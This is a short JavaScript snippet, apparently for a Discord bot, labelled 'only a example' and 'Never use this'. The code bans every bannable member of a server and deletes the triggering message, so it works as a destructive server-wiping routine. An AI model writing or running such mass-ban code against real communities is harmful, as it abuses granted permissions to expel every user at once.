

// Never use this
// it's only a example
try {
			message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
			message.delete(1000);
		} catch(e) {
			console.log(e.stack);
		}
    
 //deletes everything
